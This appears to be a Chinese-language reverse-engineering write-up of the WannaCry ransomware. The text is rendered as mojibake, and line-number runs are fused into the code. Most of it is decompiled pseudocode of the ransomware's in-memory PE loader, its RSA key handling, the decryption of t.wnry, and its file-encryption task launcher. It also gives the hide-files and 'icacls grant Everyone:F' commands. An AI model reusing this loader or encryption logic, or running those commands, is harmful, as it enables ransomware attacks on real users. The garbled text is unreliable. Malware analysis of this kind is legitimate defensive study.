è®¾ç½®å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å±æ€§ä¸ºéšè— å‘½ä»¤è¡Œå‚æ•°é”™è¯¯ å‡½æ•°å¹¶æœªæˆåŠŸ if ( dwMilliseconds ) // æ¡ä»¶ä¸æˆç«‹ è·³è½¬åˆ°å…³é—­å¥æŸ„å¤„ &#123; if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) ) TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF); if ( lpExitCode ) GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode); &#125; CloseHandle(ProcessInformation.hProcess); CloseHandle(ProcessInformation.hThread); return 1; &#125; åœ¨å‡½æ•°ä¸»é¢˜é€»è¾‘ä¸­åˆ©ç”¨åˆ°äº†ä¸¤æ¬¡ExeCmdCommandå‡½æ•°ï¼š ç¬¬ä¸€ä¸ªåˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹ å¹¶åˆ©ç”¨å‚æ•°â€attrib+hâ€å°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶è®¾ç½®ä¸ºéšè— ç¬¬äºŒä¸ªåˆ©ç”¨å‚æ•° â€œicacls ./grant Everyone:F /T /C /Qâ€æ·»åŠ ç”¨æˆ·å¹¶ç»™äºˆæƒé™ 5.3 åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œåœ¨è¿™éƒ¨åˆ†æ‰€æ¶‰åŠçš„å‡½æ•°çš„æ“ä½œéƒ½åªæœ‰ä¸€ä¸ªç›®çš„ï¼Œå³åˆ©ç”¨dllæ–‡ä»¶ä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œä¸‹é¢æˆ‘ä»¬åˆ†æ­¥è¿›è¡Œåˆ†æ 5.3.1 GetApis è·å–å¿…è¦çš„APIå‡½æ•°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071unsigned int GetApis() &#123; HMODULE KernelBase; // eax HMODULE KernelAddr; // edi FARPROC CloseHandle_Addr; // eax signed int result; // eax if ( !GetCryptoAPIAddr() ) // è·å–CryptoAPIå‡½æ•°åœ°å€ goto LABEL_15; if ( CreateFileW_Addr ) goto LABEL_16; KernelBase = LoadLibraryA(Kernel32); // åŠ è½½Kernel32.dllçš„åŸºå€ KernelAddr = KernelBase; if ( !KernelBase ) goto LABEL_15; CreateFileW_Addr = (int)GetProcAddress(KernelBase, CreateFileW);// è·å–æ–‡ä»¶æ“ä½œçš„APIå‡½æ•°åœ°å€ WriteFile_Addr = (int)GetProcAddress(KernelAddr, WriteFile_0); ReadFile_Addr = (BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))GetProcAddress( KernelAddr, ReadFile_0); MoveFileW_Addr = (int)GetProcAddress(KernelAddr, MoveFileW); MoveFileExW_Addr = (int)GetProcAddress(KernelAddr, MoveFileExW); DeleteFileW_Addr = (int)GetProcAddress(KernelAddr, DeleteFileW); CloseHandle_Addr = GetProcAddress(KernelAddr, CloseHandle_0); Int_CloseHandle_Addr = (int)CloseHandle_Addr; if ( !CreateFileW_Addr ) goto LABEL_15; if ( WriteFile_Addr &amp;&amp; ReadFile_Addr &amp;&amp; MoveFileW_Addr &amp;&amp; MoveFileExW_Addr &amp;&amp; DeleteFileW_Addr &amp;&amp; CloseHandle_Addr ) LABEL_16: result = 1; else LABEL_15: result = 0; return result; &#125; æ­¤å‡½æ•°çš„ä¸»è¦ç›®çš„å°±æ˜¯ä¸ºåé¢çš„æ“ä½œè·å–å¸¸ç”¨APIå‡½æ•°çš„åœ°å€ä¾‹å¦‚-CreateFileWã€‚ 5.3.2 CDatabase::CDataBase æ„é€ å‡½æ•°1234567891011121314151617char *__thiscall CDatabase::CDatabase(_DWORD *this) &#123; char *v1; // esi v1 = (char *)this; Crt_InitializeCriticalSection((char *)this + 4);// åˆå§‹åŒ–ä¸´ç•ŒåŒºå¯¹è±¡ Crt_InitializeCriticalSection(v1 + 44); return v1; &#125; åˆå§‹åŒ–ä¸¤ä¸ªç”¨äºçº¿ç¨‹åŒæ­¥çš„ä¸´ç•ŒåŒºå¯¹è±¡CDatabase 5.3.3 ImportKeyAndAllocMem å¯¼å…¥å¯†é’¥å¹¶ç”³è¯·ç©ºé—´123456789101112131415161718192021222324252627282930313233343536373839404142434445int __thiscall ImportKeyAndAllocMem(_DWORD *this, LPCSTR FileName, int a3, int a4) &#123; _DWORD *v4; // esi HGLOBAL hGlobal; // eax HGLOBAL hGlobal_2; // eax v4 = this; if ( !ImportPrivateKey(this + 1, FileName) ) // å¯¼å…¥ç§é’¥ return 0; if ( FileName ) ImportPrivateKey(v4 + 11, 0); hGlobal = GlobalAlloc(0, 0x100000u); // ç”³è¯·ä¸€å—å…¨å±€çš„å›ºå®šå†…å­˜å— v4[306] = hGlobal; if ( !hGlobal ) return 0; hGlobal_2 = GlobalAlloc(0, 0x100000u); v4[307] = hGlobal_2; if ( !hGlobal_2 ) return 0; v4[309] = a3; v4[308] = a4; return 1; &#125; è¿™ä¸ªå‡½æ•°å®Œæˆäº†ä¸¤é¡¹å·¥ä½œï¼š å¯¼å…¥ RSA ç§é’¥ï¼Œç”¨æ¥è§£å¯†åé¢çš„ç›¸å…³æ–‡ä»¶ ç”³è¯·äº†ä¸¤å—å¤§å°ä¸º 0x100000 çš„å†…å­˜ 5.3.4 DecryptFile è§£å¯†t.wnry123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081int __thiscall DecryptFile(void this, LPCSTR lpFileName, int DecryptFileSize) &#123; hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);// ä»¥åªè¯»çš„æ–¹å¼æ‰“å¼€t.wnry if ( hFile != (HANDLE)INVALID_HANDLE_VALUE ) &#123; GetFileSizeEx(hFile, &amp;FileSize); // è·å–æ–‡ä»¶å¤§å° if ( FileSize.QuadPart &lt;= 0x6400000 ) &#123; if ( ReadFile_Addr(hFile, &amp;lpBuffer, 8u, &amp;lpNumberOfBytesRead, 0) )// è¯»å–8ä¸ªå­—èŠ‚çš„æ–‡ä»¶å†…å®¹ è¯»å–çš„å†…å®¹ä¸ºWANACRY! &#123; if ( !memcmp(&amp;lpBuffer, aWanacry, 8u) ) &#123; if ( ReadFile_Addr(hFile, &amp;Buffer, 4u, &amp;lpNumberOfBytesRead, 0) )// ç»§ç»­å‘åè¯»å–4ä¸ªå­—èŠ‚çš„å†…å®¹ è¯»å–çš„å†…å®¹ä¸º0x100 &#123; if ( Buffer == 0x100 ) &#123; if ( ReadFile_Addr(hFile, pBuffer[306], 0x100u, &amp;lpNumberOfBytesRead, 0) )// è¯»å–0x100ä¸ªå­—èŠ‚ &#123; if ( ReadFile_Addr(hFile, &amp;buff, 4u, &amp;lpNumberOfBytesRead, 0) )// å†æ¬¡è¯»å–4ä¸ªå­—èŠ‚ å†…å®¹ä¸º04 &#123; if ( ReadFile_Addr(hFile, &amp;buffer, 8u, &amp;lpNumberOfBytesRead, 0) )// ç»§ç»­å¾€åè¯»8å­—èŠ‚-&gt;10000 &#123; if ( buffer &lt;= 0x6400000 ) &#123; if ( DecryptData((int)(pBuffer + 1), (BYTE *)pBuffer[306], Buffer, &amp;DecryptDatas, (int)&amp;DataSize) )// å¯¹è¯»å–çš„0x100ä¸ªå­—èŠ‚è¿›è¡Œè§£å¯† &#123; sub_402A76((char *)pBuffer + 84, (int)&amp;DecryptDatas, Src, DataSize, 0x10u); hGlobal_3 = (int)GlobalAlloc(0, buffer); if ( hGlobal_3 ) &#123; if ( ReadFile_Addr(hFile, pBuffer[306], FileSize.LowPart, &amp;lpNumberOfBytesRead, 0)// è¯»å–0x10000ä¸ªå­—èŠ‚ &amp;&amp; lpNumberOfBytesRead &amp;&amp; (buffer &lt; 0 || SHIDWORD(buffer) &lt;= 0 &amp;&amp; lpNumberOfBytesRead &gt;= (unsigned int)buffer) ) &#123; pFileAddr = hGlobal_3; DecryptPEFile((int)(pBuffer + 21), pBuffer[306], hGlobal_3, lpNumberOfBytesRead, 1);// å°†è¯»å–çš„å†…å®¹è§£å¯†æˆä¸€ä¸ªPEæ–‡ä»¶ *(_DWORD *)DecryptFileSize = buffer; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; local_unwind2((int)&amp;ms_exc.registration, -1); return pFileAddr; // è¿”å›è§£æå‡ºçš„æ–‡ä»¶é¦–åœ°å€ &#125; åœ¨å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸€ç›´å¯¹t.wnryæ–‡ä»¶æ‰§è¡Œè¯»å–æ“ä½œï¼Œæ¯è¯»å–ä¸€ä¸ªç‰‡æ®µåˆ°å†…å­˜è¾¹åˆ©ç”¨å·²æœ‰çš„RSAç§é’¥è¿›è¡Œè§£å¯†ï¼Œè¿”å›è§£å¯†åçš„æ–‡ä»¶å†…å®¹ã€‚ å›¾åäº”ï¼šODæŸ¥çœ‹å‡½æ•°è¿”å›å€¼ æŸ¥çœ‹è§£å¯†åçš„æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªPEæ–‡ä»¶ï¼Œé€šè¿‡å¯¹æ–‡ä»¶æºç å’Œç»“æ„çš„åˆ†æï¼Œåˆ¤æ–­å®ƒæ˜¯ä¸€ä¸ªdllæ–‡ä»¶ï¼Œä¸”æ˜¯å…ˆå‰èµ„æºåŒ…ä¸­çš„t_wnry.dllã€‚ 5.3.5 WriteAllocMem æ‹·è´PEæ–‡ä»¶åˆ°å†…å­˜123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278int *__cdecl sub_4021E9(void *pFileBase, int FileSize, int VirtualAlloc_Addr, int VirtualFree_Addr, int LoadLibraryA_Addr, int GetProcAddress_Addr, int FreeLibrary_Addr, int a8) &#123; v28 = 0; if ( !CmpFileSize(FileSize, 0x40u) ) // æ¯”è¾ƒæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äºç­‰äº0x40 return 0; if ( *(_WORD *)pFileBase != 0x5A4D ) // åˆ¤æ–­æ˜¯å¦æ˜¯PEæ–‡ä»¶ goto LABEL_3; if ( !CmpFileSize(FileSize, *((_DWORD *)pFileBase + 0xF) + 0xF8) )// æ¯”è¾ƒæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äºç­‰äº0x1F0 return 0; NtHeader = (char *)pFileBase + *((_DWORD *)pFileBase + 0xF); if ( *(_DWORD *)NtHeader != 0x4550 ) // åˆ¤æ–­æ˜¯å¦æ˜¯PEæ–‡ä»¶ goto LABEL_3; if ( *((_WORD *)NtHeader + 2) != 0x14C ) // åˆ¤æ–­æ–‡ä»¶è¿è¡Œå¹³å° 0x14Cä»£è¡¨I386 goto LABEL_3; SectionAlignment = *((_DWORD *)NtHeader + 14); if ( SectionAlignment &amp; 1 ) // åˆ¤æ–­å†…å­˜å¯¹é½ç²’åº¦ goto LABEL_3; NumberOfSection = *((unsigned __int16 *)NtHeader + 3); if ( *((_WORD *)NtHeader + 3) ) // åˆ¤æ–­åŒºæ®µæ•°é‡ &#123; TextName = &amp;NtHeader[*((unsigned __int16 *)NtHeader + 10) + 0x24];// å–å‡ºSectionHeader[0]-&gt;name-----.text do &#123; TextSize = *((_DWORD *)TextName + 1); // å–å‡ºSectionHeader[0]-&gt;SizeOfRawData-----0x6000 TextVirtualAddress = *(_DWORD *)TextName; // å–å‡ºSectionHeader[0]-&gt;VirtualAddersss-----0x1000 if ( TextSize ) SectionHeader[1] = TextSize + TextVirtualAddress;// ä»£ç æ®µçš„å¤§å°+ä»£ç æ®µçš„èµ·å§‹åœ°å€=ä¸‹ä¸€ä¸ªåŒºæ®µçš„èµ·å§‹åœ°å€ else SectionHeader[1] = SectionAlignment + TextVirtualAddress; if ( SectionHeader[1] &gt; v28 ) v28 = SectionHeader[1]; TextName += 0x28; --NumberOfSection; &#125; while ( NumberOfSection ); // éå†åŒºæ®µ &#125; hKernel32 = GetModuleHandleA(Kernel32); // è·å–Kernel32çš„åŸºå€ if ( !hKernel32 ) return 0; GetSystemInfo_Addr = (void (__stdcall *)(char *))((int (__cdecl *)(HMODULE, void (__stdcall *)(LPSYSTEM_INFO), _DWORD))GetProcAddress_Addr)ã€(hKernel32, GetNativeSystemInfo, 0);// è·å–GetNativeSystemInfoå‡½æ•°åœ°å€ if ( !GetSystemInfo_Addr ) return 0; GetSystemInfo_Addr(&amp;lpSystemInfo); // è·å–ç³»ç»Ÿä¿¡æ¯ v17 = ~(v27 - 1); dwSize = v17 &amp; (*((_DWORD *)NtHeader + 20) + v27 - 1); if ( dwSize != (v17 &amp; (v27 + v28 - 1)) ) // æ­¤å¤„æ¡ä»¶ä¸æˆç«‹ è·³è¿‡ifåˆ†æ”¯ &#123; LABEL_3: SetLastError(0xC1u); return 0; &#125; pAllocAddress = ((int (__cdecl *)(_DWORD, int, signed int, MACRO_PAGE, int))VirtualAlloc_Addr)( *((_DWORD *)NtHeader + 13), dwSize, 0x3000, PAGE_READWRITE, a8); // ç”³è¯·ä¸€å—å¤§å°ä¸º0x10000çš„å¯è¯»å¯å†™çš„å†…å­˜ç©ºé—´ if ( !pAllocAddress ) &#123; pAllocAddress = ((int (__cdecl *)(_DWORD, int, signed int, MACRO_PAGE, int))VirtualAlloc_Addr)( 0, dwSize, 0x3000, PAGE_READWRITE, a8); // å¦‚æœç”³è¯·å¤±è´¥åˆ™å†æ¬¡ç”³è¯· if ( !pAllocAddress ) &#123; LABEL_24: SetLastError(0xEu); return 0; &#125; &#125; hHeap = GetProcessHeap(); // è·å–è¿›ç¨‹çš„å †å¥æŸ„ pHeapAddress = (unsigned int)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x3Cu); pHeapBase = (int *)pHeapAddress; if ( !pHeapAddress ) &#123; ((void (__cdecl *)(int, _DWORD, signed int, int))VirtualFree_Addr)(pAllocAddress, 0, 0x8000, a8); goto LABEL_24; &#125; *(_DWORD *)(pHeapAddress + 4) = pAllocAddress; LOWORD(pHeapAddress) = *((_WORD *)NtHeader + 11); pHeapBase[5] = (pHeapAddress &gt;&gt; 13) &amp; 1; pHeapBase[7] = VirtualAlloc_Addr; pHeapBase[8] = VirtualFree_Addr; pHeapBase[9] = LoadLibraryA_Addr; pHeapBase[10] = GetProcAddress_Addr; pHeapBase[11] = FreeLibrary_Addr; pHeapBase[12] = a8; pHeapBase[14] = v27; if ( !CmpFileSize(FileSize, *((_DWORD *)NtHeader + 0x15))// æ¯”è¾ƒæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äºç­‰äºSizeOfHeaders 0x1000 || (AllocAddr = (char *)((int (__cdecl *)(int, _DWORD, signed int, signed int, int))VirtualAlloc_Addr)( pAllocAddress, *((_DWORD *)NtHeader + 21), 0x1000, 4, a8), // ç”³è¯·ä¸€å—å¤§å°ä¸º0x1000çš„å¯è¯»å¯å†™çš„å†…å­˜ 0x1000æ˜¯SizeOfHeaders memcpy(AllocAddr, pFileBase,*((_DWORD *)NtHeader + 21)),// æŠŠPEå¤´æ‹·è´åˆ°ç”³è¯·çš„å †ç©ºé—´ NtHeaderBaseAddr = (int)&amp;AllocAddr[*((_DWORD *)pFileBase + 0xF)], *pHeapBase = NtHeaderBaseAddr, *(_DWORD *)(NtHeaderBaseAddr + 52) = pAllocAddress, !sub_402470((int)pFileBase, FileSize, (int)NtHeader, (int)pHeapBase)) || (*(_DWORD *)(*pHeapBase + 52) == *((_DWORD *)NtHeader + 13) ? (pHeapBase[6] = 1) : (pHeapBase[6] = sub_402758(pHeapBase, *(_DWORD *)(*pHeapBase + 52) - *((_DWORD *)NtHeader + 13))), !sub_4027DF(pHeapBase) || !sub_40254B(pHeapBase) || !sub_40271D(pHeapBase)) ) &#123; LABEL_37: sub_4029CC(pHeapBase); return 0; &#125; v24 = *(_DWORD *)(*pHeapBase + 40); if ( v24 ) &#123; if ( pHeapBase[5] ) &#123; if ( !((int (__stdcall *)(int, signed int, _DWORD))(pAllocAddress + v24))(pAllocAddress, 1, 0) ) &#123; SetLastError(0x45Au); goto LABEL_37; &#125; pHeapBase[4] = 1; &#125; else &#123; pHeapBase[13] = pAllocAddress + v24; &#125; &#125; else &#123; pHeapBase[13] = 0; &#125; return pHeapBase; &#125; è¯¥å‡½æ•°ç”³è¯·äº†ä¸€å—å †ç©ºé—´ å¹¶å°†å»æ‰äº†è§£å¯†å‡ºçš„PEæ–‡ä»¶çš„DOSå¤´å¹¶æ‹·è´åˆ°äº†å †ç©ºé—´ä¸­ 5.3.6 GetExportFunAddr è·å–å¯¼å‡ºå‡½æ•°åœ°å€123456789101112131415AllocBase = (_DWORD )(pHeapBase + 4); // AllocBase=0x10000000 æ˜¯ç”³è¯·çš„ç©ºé—´çš„åŸºå€ DataDirectory = (int)((_DWORD )pHeapBase + 0x78);// peå¤´+0x78=æ•°æ®ç›®å½•è¡¨ AllocBase_2 = (_DWORD )(pHeapBase + 4); if ( !(_DWORD )((_DWORD )pHeapBase + 0x7C) ) goto LABEL_12; ExportRVA = DataDirectory; // å–å‡ºæ•°æ®ç›®å½•è¡¨çš„ç¬¬ä¸€é¡¹-&gt;å¯¼å‡ºè¡¨çš„RVA NumberOfNames = (_DWORD )(DataDirectory + AllocBase + 0x18);// å–å‡ºä»¥åç§°æ–¹å¼å¯¼å‡ºçš„å‡½æ•°æ•°é‡ ExportVA = (_DWORD )(AllocBase + ExportRVA); // åŸºå€+å¯¼å‡ºè¡¨çš„RVA=å¯¼å‡ºè¡¨çš„VA è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° å †ç©ºé—´çš„é¦–åœ°å€ å’ŒTaskStartè¿™ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›äº†å¯¼å‡ºå‡½æ•°åœ°å€ å¯¹äºå‡½æ•°é€»è¾‘ï¼šè¿™ä¸ªå‡½æ•°é¦–å…ˆå–å‡ºäº†æ•°æ®ç›®å½•è¡¨ï¼Œå¹¶æ ¹æ®æ•°æ®ç›®å½•è¡¨æ‰¾åˆ°äº†å¯¼å‡ºè¡¨ï¼Œæ¥ç€æˆ‘ä»¬çœ‹ä¸€ä¸‹dllæ–‡ä»¶çš„å¯¼å‡ºè¡¨ï¼š å›¾åå…­ï¼št_wnry.dll å¯¼å‡ºè¡¨ å¾—çŸ¥TaskStartå°±æ˜¯ä¼ è¿›å»çš„ç¬¬äºŒä¸ªå‚æ•° 5.4 å°ç»“ è·å–å¿…è¦çš„APIå‡½æ•°åœ°å€ å¯¼å…¥ç§é’¥å¹¶ç”³è¯·ç©ºé—´ ç”¨å¯¼å…¥çš„ç§é’¥è§£å¯†å‡ºä¸€ä¸ªdll ç”³è¯·ä¸€å—å †ç©ºé—´ å°†dllå†™å…¥åˆ°å †å†…å­˜é‡Œ åœ¨å †å†…å­˜ä¸­æ‰¾åˆ°dllçš„å¯¼å‡ºå‡½æ•°åœ°å€ å¹¶è°ƒç”¨ ä»ä¸Šé¢çš„åˆ†æå¯ä»¥å¾—å‡ºç—…æ¯’çš„ä¸»ä½“ç¨‹åºå®é™…ä¸Šåªåšäº†ä¸€äº›åˆå§‹åŒ–çš„æ“ä½œåˆ°ç›®å‰ä¸ºæ­¢å¹¶æ²¡æœ‰çœ‹åˆ°å®ƒæ„ŸæŸ“æˆ–åŠ å¯†ä»»ä½•ä¸€ä¸ªæ–‡ä»¶ ä¹Ÿæ²¡æœ‰å¯¹ç”¨æˆ·è¿›è¡Œå‹’ç´¢çœŸæ­£çš„æ ¸å¿ƒä»£ç åœ¨t.wnryä¸­ ç”±äºè¿™ä¸ªå‡½æ•°æ˜¯åœ¨å †ç©ºé—´ä¸­è°ƒç”¨æ‰€ä»¥åœ¨IDAä¸­å¹¶æ²¡æœ‰æ˜¾ç¤ºå‡ºä¼ªCä»£ç  é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åˆ†æåˆšåˆšæå–å‡ºæ¥çš„dll 5.5 åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œåœ¨è¿™éƒ¨åˆ†æ‰€æ¶‰åŠçš„å‡½æ•°çš„æ“ä½œéƒ½åªæœ‰ä¸€ä¸ªç›®çš„ï¼Œå³åˆ©ç”¨dllæ–‡ä»¶ä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œä¸‹é¢æˆ‘ä»¬åˆ†æ­¥è¿›è¡Œåˆ†æ 5.3.1 GetApis è·å–å¿…è¦çš„APIå‡½æ•°6 t.wnry.dll ç—…æ¯’æ ¸å¿ƒéƒ¨åˆ†åˆ†æ6.1 ä¸»ä½“é€»è¾‘t.wnry.dllä½œä¸ºç—…æ¯’çš„æ ¸å¿ƒéƒ¨åˆ†ï¼ŒåŒ…æ‹¬äº†ç—…æ¯’æ‰€æœ‰çš„å±å®³æ“ä½œï¼ŒåŒ…æ‹¬åŠ å¯†è§£å¯†æ–‡ä»¶ï¼Œå‹’ç´¢ç”¨æˆ·ç­‰æœ‰å®³æ“ä½œï¼Œä¸‹é¢æˆ‘å°†ä¸ºå¤§å®¶ä¸€æ­¥æ­¥çš„è¿›è¡Œåˆ†æï¼š 6.1.1 TaskStart ç—…æ¯’çš„é€»è¾‘ä¸»ä½“å‡½æ•°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152int __stdcall TaskStart(HMODULE hModule, int a2) &#123;if ( a2 || RunSingle() ) // äº’æ–¥ä½“é˜²åŒå¼€ return 0; Filename = word_1000D918; // åˆå§‹åŒ–ç¼“å†²åŒº memset(&amp;v12, 0, 0x204u); v13 = 0; GetModuleFileNameW(hModule, &amp;Filename, 0x103u);// è·å–å½“å‰è¿›ç¨‹çš„å®Œæ•´è·¯å¾„ if ( wcsrchr(&amp;Filename, &#x27;&#x27;) ) *wcsrchr(&amp;Filename, &#x27;&#x27;) = 0; // è·å–åˆ°å­—ç¬¦ä¸²-&gt;.wcry.exe SetCurrentDirectoryW(&amp;Filename); if ( !ReadFileToMem(&amp;c_wnryBase, 1) ) // è¯»å–c.wnryåˆ°å†…å­˜ return 0; StartIsSuccess = GetUsersidAndCmp(); // è·å–å½“å‰ç”¨æˆ·çš„SIDå¹¶ä¸ç³»ç»Ÿçš„SIDä½œæ¯”è¾ƒ if ( !GetApis() ) // è·å–å¿…è¦çš„APIå‡½æ•°åœ°å€ return 0; sprintf(FileName_0, a08xRes, 0); // Dest=00000000.res sprintf(FileName, a08xPky, 0); // FileName=00000000.pky sprintf(buff, a08xEky, 0); // buff=00000000.eky if ( SetAccessControl(0) || sub_10004500(0) ) // 1.è®¾ç½®è®¿é—®æ§åˆ¶å±æ€§ 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨00000000.pkyè¿™ä¸ªæ–‡ä»¶ ç”±äºä¸å­˜åœ¨ ç›´æ¥return &#123; hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartExeAndSetReg,0, 0, 0);// æ¡ä»¶ä¸æˆç«‹ è·³è¿‡è¿™ä¸ªifåˆ†æ”¯ éšè—åˆ†æ”¯å¾…åˆ†æ WaitForSingleObject(hThread, 0xFFFFFFFF); CloseHandle(hThread); return 0; &#125; lpAddress = (char)operator new(0x28u); // ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´ v14 = 0; if ( lpAddress ) v3 = InitializeCriSection(lpAddress); // åˆå§‹åŒ–ä¸´ç•ŒåŒº elsev3 = 0; v14 = -1; if ( !v3 || !CreatePkyAndEky(v3, FileName, buff) )// åˆ›å»º00000000.pkyå’Œ00000000.eky ä¸€ä¸ªæ˜¯å…¬é’¥ ä¸€ä¸ªæ˜¯åŠ å¯†åçš„ç§é’¥ return 0; if ( !OpenResFile() || dword_1000DC70 ) // æ‰“å¼€00000000.resæ–‡ä»¶ &#123; DeleteFileA(FileName_0); memset(&amp;RandomBytes, 0, 0x88u); dword_1000DC70 = 0; GetRandom((HCRYPTPROV)v3, &amp;RandomBytes, 8u);// è·å–0x8ä¸ªå­—èŠ‚çš„éšæœºæ•° &#125; DestoryHandle(v3); ((void (__thiscall )(char , signed int))v3)(v3, 1);//éšè—å‡½æ•° ç”¨äºé‡Šæ”¾ä¸´ç•ŒåŒº hThread_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CreateResFile, 0, 0, 0);// åˆ›å»º00000000.resæ–‡ä»¶ if ( hThread_1 ) CloseHandle(hThread_1); Sleep(100u); hThread_2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CheckDky, 0, 0, 0);// æ¯éš”äº”ç§’æ£€æµ‹æ˜¯å¦å­˜åœ¨774F34B5.dkyè¿™ä¸ªæ–‡ä»¶ ç”±äºæ–‡ä»¶ä¸å­˜åœ¨ ç›´æ¥return if ( hThread_2 ) CloseHandle(hThread_2); Sleep(100u); hThread_3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)EncryptAllFiles, 0, 0, 0);// åŠ å¯†æ‰€æœ‰æ–‡ä»¶ Sleep(100u); hThread_4 = CreateThread(0, 0, StartTaskdl, 0, 0, 0);// æ¯éš”ä¸‰ç§’ä»¥éšè—çš„æ–¹å¼å¯åŠ¨taskdl.exe if ( hThread_4 ) CloseHandle(hThread_4); Sleep(100u); hThread_5 = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)StartExeAndSetReg, 0, 0, 0);// æ¯éš”ä¸‰ç§’ å¯åŠ¨taskse.exeå’Œ@WanaDecryptor@.exeå¹¶ä¸”ä¿®æ”¹æ³¨å†Œè¡¨ if ( hThread_5 ) CloseHandle(hThread_5); Sleep(100u); RepeatOperation(); // åˆ›å»ºæ‰¹å¤„ç†è„šæœ¬åŠ å¯†å™¨ Read_Me@.txt åŠ å¯†å…¶ä»–ç”¨æˆ·ä¸‹çš„æ–‡ä»¶ if ( hThread_3 ) &#123; WaitForSingleObject(hThread_3, INFINITE); CloseHandle(hThread_3); &#125; return 0; &#125; Dll æ–‡ä»¶ä¸»é¢˜åŒ…æ‹¬äº†ç—…æ¯’çš„æ‰€æœ‰æ“ä½œï¼š åˆå§‹ ä¸´ç•ŒåŒºï¼Œç¼“å†²åŒºï¼Œè·¯å¾„ï¼Œå­—ç¬¦ä¸²å¹¶å°†c.wnryè¯»åˆ°å†…å­˜ å»ºç«‹ å…¬é’¥ï¼Œç§é’¥æ–‡ä»¶ï¼Œå¹¶åŠ å¯†æ‰€æœ‰æ–‡ä»¶ æ¯éš”ä¸‰ç§’ éšè—æ–¹å¼å¯åŠ¨ taskdl.exe taskse.exe ç­‰æ–‡ä»¶ åˆ›å»ºæ‰¹å¤„ç†è„šæœ¬ åŠ å¯†å™¨ Read_Me@.txt åŠ å¯†å…¶ä»–ç”¨æˆ·ä¸‹çš„æ–‡ä»¶ 6.1.2 GetUsersidAndCmp è·å–å½“å‰ç”¨æˆ·SIDå¹¶ä¸ç³»ç»Ÿçš„SIDä½œæ¯”è¾ƒ123456memset(&amp;v4, 0, 0x254u); // å°†buffç¼“å†²åŒºæ¸…é›¶ if ( GetCurrentUserSID(&amp;Buffer) ) // è·å–å½“å‰ç”¨æˆ·çš„SID &#123; v0 = wcsicmp(aS1518, &amp;Buffer); // æ¯”è¾ƒå½“å‰çš„SIDæ˜¯å¦æ˜¯S-1-5-18-&gt;ç³»ç»Ÿçš„SID &#125; ä»æ³¨å†Œè¡¨ä¸­è·å–åˆ°å½“å‰ç”¨æˆ·çš„SIDå¹¶äºç³»ç»Ÿçš„SIDåšæ¯”è¾ƒ 6.1.3 CreatePkyAndEky åˆ›å»º pky å’Œ eky æ–‡ä»¶12345678910111213141516171819202122232425262728293031323334353637383940414243444546if ( !GetCSPHandle((char) this) ) // è·å–CSPæœåŠ¡ç¨‹åºå¥æŸ„ &#123; DestoryHandle(v3); // å¦‚æœå¤±è´¥åˆ™é‡Šæ”¾èµ„æº return 0; &#125; if ( lpFileName ) &#123; if ( !ImportPubKey(v3, lpFileName) ) // å½“00000000.pkyä¸å­˜åœ¨æ—¶ æ¡ä»¶æˆç«‹ &#123; if ( !CryptImportKey_Addr(v3[1], &amp;pbData, 0x114, 0, 0, v3 + 3)// å¯¼å…¥RSAå…¬é’¥ || !CryptGenKey(v3[1], (int)(v3 + 2)) // ç”Ÿæˆå¯å¯¼å‡ºçš„2048ä½RSAç­¾åå¯†é’¥ || !CreatePkyFile(v3[1], v3[2], 6u, lpFileName) )// åˆ›å»º00000000.pkyæ–‡ä»¶ å¹¶å†™å…¥ç”Ÿæˆçš„RSAå…¬é’¥ &#123; goto LABEL_19; &#125; if ( pky_str ) CreateEkyFile((int)v3, pky_str); // åˆ›å»º00000000.ekyæ–‡ä»¶ å¹¶å†™å…¥åŠ å¯†åçš„RSAç§é’¥ if ( !ImportPubKey(v3, lpFileName) ) // å¯¼å…¥00000000.pkyçš„å…¬é’¥ &#123; BEL_19: DestoryHandle(v3); // å¦‚æœå¯¼å…¥å¤±è´¥é‡Šæ”¾å¥æŸ„ return 0; &#125; &#125; v5 = v3[3]; // å½“00000000.pkyå­˜åœ¨æ—¶ 